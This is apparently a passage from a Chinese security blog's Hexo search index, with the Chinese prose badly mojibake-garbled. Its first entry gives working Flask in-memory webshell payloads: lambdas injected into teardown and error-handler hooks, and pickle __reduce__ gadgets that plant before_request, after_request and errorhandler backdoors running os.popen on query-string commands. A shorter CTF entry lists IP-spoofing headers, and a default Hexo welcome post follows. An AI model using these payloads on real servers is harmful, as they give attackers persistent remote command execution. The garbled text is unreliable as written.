è£…é¥°å™¨æ³¨å†Œçš„å›è°ƒå‡½æ•°éœ€è¦æ¥æ”¶å¼‚å¸¸å¯¹è±¡ä½œä¸ºå‚æ•°,å½“è¯·æ±‚è¢«æ­£å¸¸å¤„ç†æ—¶è¿™ä¸ªå‚æ•°å°†æ˜¯None,è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼å°†è¢«å¿½ç•¥.</p><h2 id="before-request-after-requestå’Œ-teardown-request-teardown-appcontextçš„åŒºåˆ«"><a href="#before-request-after-requestå’Œ-teardown-request-teardown-appcontextçš„åŒºåˆ«" class="headerlink" title="@before_request&#x2F;@after_requestå’Œ**@teardown_request**&#x2F;@teardown_appcontextçš„åŒºåˆ«"></a><strong>@before_request</strong>&#x2F;<strong>@after_request</strong>å’Œ**@teardown_request**&#x2F;<strong>@teardown_appcontext</strong>çš„åŒºåˆ«</h2><p><strong>@after_request</strong>æ˜¯åœ¨è§†å›¾å‡½æ•°å¤„ç†å®Œè¯·æ±‚å¹¶ç”Ÿæˆå“åº”å¯¹è±¡ä¹‹åï¼Œä½†åœ¨å“åº”è¢«å‘é€ç»™å®¢æˆ·ç«¯ä¹‹å‰ã€‚è€Œä¸”è¿™ä¸ªå‡½æ•°éœ€è¦æ¥æ”¶å½“å‰çš„å“åº”ä½œä¸ºå‚æ•°,å¹¶å¯ä»¥è¿”å›ä¸€ä¸ªæ–°çš„å“åº”å¯¹è±¡æˆ–è€…è¿”å›åŸæ¥çš„å“åº”å¯¹è±¡.</p><p><strong>@teardown_request</strong>&#x2F;<strong>@teardown_appcontext</strong>æ— è®ºè¯·æ±‚æ˜¯å¦æˆåŠŸå®Œæˆï¼Œæ— è®ºæ˜¯å¦å‘ç”Ÿäº†å¼‚å¸¸,æ˜¯åœ¨å“åº”å·²ç»è¢«å‘é€ç»™å®¢æˆ·ç«¯ä¹‹åè¢«è§¦å‘,è€Œä¸”ä¸æ¥å—ä»»ä½•å‚æ•°.</p><p><strong>@after_request</strong>è£…é¥°çš„å‡½æ•°å¦‚æœæŠ›å‡ºäº†å¼‚å¸¸å°±ä¼šç›´æ¥è·³è½¬åˆ°é”™è¯¯å¤„ç†æœºåˆ¶.</p><p><strong>@teardown_request</strong>&#x2F;<strong>@teardown_appcontext</strong>è£…é¥°çš„å‡½æ•°è¢«æŠ›å‡ºçš„å¼‚å¸¸é€šå¸¸ä¼šè¢«å¿½ç•¥.</p><h2 id="teardown-requestçš„åˆ©ç”¨"><a href="#teardown-requestçš„åˆ©ç”¨" class="headerlink" title="@teardown_requestçš„åˆ©ç”¨"></a><strong>@teardown_request</strong>çš„åˆ©ç”¨</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>**ä¸èƒ½è°ƒç”¨<code>request.args.get()</code>åŠ¨æ€æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤,**ä½†æ˜¯å¯ä»¥æ‰§è¡Œæ³¨å…¥çš„ä»£ç .<strong>æ¯æ¬¡åˆ·æ–°ç½‘é¡µéƒ½ä¼šæ‰§è¡Œ</strong>.åŸå› æ˜¯è¿™ä¸ªè£…é¥°å™¨çš„è§¦å‘æ˜¯åœ¨è¯·æ±‚è¢«é”€æ¯åçš„.åœ¨è¿™ä¸ªæ—¶å€™ä¸Šä¸€ä¸ªHTTPè¯·æ±‚å¸§å·²ç»è¢«é”€æ¯äº†,ä½†æ˜¯å¯ä»¥æ‰§è¡Œé™æ€å‘½ä»¤.</p><h2 id="teardown-appcontextçš„åˆ©ç”¨"><a href="#teardown-appcontextçš„åˆ©ç”¨" class="headerlink" title="@teardown_appcontextçš„åˆ©ç”¨"></a>@teardown_appcontextçš„åˆ©ç”¨</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_appcontext_funcs.append(<span class="keyword">lambda</span> x :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>åŒæ ·<strong>ä¸èƒ½è°ƒç”¨<code>request.args.get()</code>åŠ¨æ€æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤</strong>,ä½†æ˜¯å¯ä»¥æ‰§è¡Œæ³¨å…¥çš„ä»£ç .<strong>æ¯æ¬¡åˆ·æ–°ç½‘é¡µéƒ½ä¼šæ‰§è¡Œ</strong>.åŸå› æ˜¯è¿™ä¸ªè£…é¥°å™¨çš„è§¦å‘æ˜¯åœ¨è¯·æ±‚è¢«é”€æ¯åçš„.ä¸ç„¶ä¼šæŠ¥é”™</p><h2 id="errorhandler-çš„åˆ©ç”¨"><a href="#errorhandler-çš„åˆ©ç”¨" class="headerlink" title="**@errorhandler()**çš„åˆ©ç”¨"></a>**@errorhandler()**çš„åˆ©ç”¨</h2><p>è¯¥è£…é¥°å™¨å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªç”¨äºæ³¨å†Œé”™è¯¯å¤„ç†å‡½æ•°çš„å‡½æ•°</p><p><img src="D:\Typora\images\QQ20241231-213141.png"></p><p>è·Ÿåˆ°è¿™ä¸ª<code>register_error_handler()</code>é‡Œè¾¹</p><p><img src="D:\Typora\images\QQ20241231-213312.png"></p><p>å¯ä»¥å‘ç°ä»–ç»™è¿™ä¸ª<code>self.error_hander_spec</code>è¿™ä¸ªå­—å…¸é‡Œæ·»åŠ äº†ä¸€ä¸ªå‡½æ•°,å°±æ˜¯é”™è¯¯å¤„ç†å‡½æ•°.</p><p>å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>code</code>å’Œ<code>exc_class</code>,æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨é”™è¯¯å¤„ç†çš„é€»è¾‘æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„å‡½æ•°.é‚£ä¹ˆ<code>code</code>å’Œ<code>exc_class</code>æ˜¯ä»å“ªé‡Œæ¥çš„å‘¢,çœ‹656è¡Œçš„<code>self._get_exc_class_and_code</code>,è¿›å…¥è¿™ä¸ªæ–¹æ³•å¯ä»¥å‘ç°ä»–è¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„,å…ƒç»„é‡Œæœ‰ä¸€ä¸ªé”™è¯¯çš„ç±»å’Œä¸€ä¸ªæ•´æ•°</p><p><img src="D:\Typora\images\QQ20241231-213455.png"></p><p>è¿™é‡Œç›´æ¥è°ƒç”¨<code>_get_exc_class_and_code()</code>è¿™ä¸ªæ–¹æ³•ç„¶åæŠŠä»–çš„è¿”å›å€¼æ‰”åˆ°<code>self.error_hander_spec</code>è¿™ä¸ªå­—å…¸é‡Œ.ç„¶åç»™ä»–èµ‹å€¼æˆ‘ä»¬æ„é€ çš„å‡½æ•°.<code>_get_exc_class_and_code()</code>çš„å½¢å‚æ˜¯ä¸€ä¸ªæ•´æ•°å°±æ¯”è¾ƒæ–¹ä¾¿è°ƒç”¨äº†.</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥ç›´æ¥å¸¦å‡ºå›æ˜¾çš„</p><h1 id="pickleåˆ©ç”¨ä¸‹çš„payload"><a href="#pickleåˆ©ç”¨ä¸‹çš„payload" class="headerlink" title="pickleåˆ©ç”¨ä¸‹çš„payload"></a>pickleåˆ©ç”¨ä¸‹çš„payload</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h1 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h1><p>è¿™é‡Œå‚è€ƒSSTIçš„ç»•è¿‡</p><ul><li><strong><code>url_for</code>å¯æ›¿æ¢ä¸º<code>get_flashed_messages</code>æˆ–è€…<code>request.__init__</code>æˆ–è€…<code>request.application</code></strong></li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><a href="https://xz.aliyun.com/news/10381">æ–°ç‰ˆFLASKä¸‹pythonå†…å­˜é©¬çš„ç ”ç©¶</a></li><li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">Python å†…å­˜é©¬åˆ†æ</a></li><li><a href="https://xz.aliyun.com/news/13976">æ–°ç‰ˆFlaskæ¡†æ¶ä¸‹ç”¨é’©å­å‡½æ•°å®ç°å†…å­˜é©¬çš„æ–¹å¼</a></li><li><a href="https://chensonghi.github.io/2024/07/20/Memory-Horse-in-Flask/">flaskä¸‹çš„å†…å­˜é©¬</a></li><li>[ä¸€äº›python RCEåˆ©ç”¨&amp;&amp;å†…å­˜é©¬](</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFä¸­çš„IPä¼ªé€ </title>
      <link href="/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ä¸€äº›CTFæ¯”èµ›å¸¸å¸¸ä¼šè€ƒåˆ°é€šè¿‡<strong>ä¼ªé€ IP</strong>è·å¾—flagï¼Œä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„IPä¼ªé€ çš„è¯·æ±‚å¤´ï¼š</p><ul><li><strong>X-Forwarded-For:127.0.0.1</strong></li><li><strong>Client-ip:127.0.0.1</strong></li><li><strong>X-Client-IP:127.0.0.1</strong></li><li><strong>X-Remote-IP:127.0.0.1</strong></li><li><strong>X-Rriginating-IP:127.0.0.1</strong></li><li><strong>X-Remote-addr:127.0.0.1</strong></li><li><strong>HTTP_CLIENT_IP:127.0.0.1</strong></li><li><strong>X-Real-IP:127.0.0.1</strong></li><li><strong>X-Originating-IP:127.0.0.1</strong></li><li><strong>via:127.0.0.1</strong></li><li><strong>X-Forwarded:127.0.0.1</strong></li><li><strong>X-Forwarded-Host:127.0.0.1</strong></li><li><strong>True-Client-IP:127.0.0.1</strong></li><li><strong>Ali-CDN-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Src-IP:127.0.0.1</strong></li><li><strong>CF-Connecting-IP:127.0.0.1</strong></li><li><strong>Proxy-Client-IP:127.0.0.1</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/01/31/hello-world/"/>
      <url>/2025/01/31/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
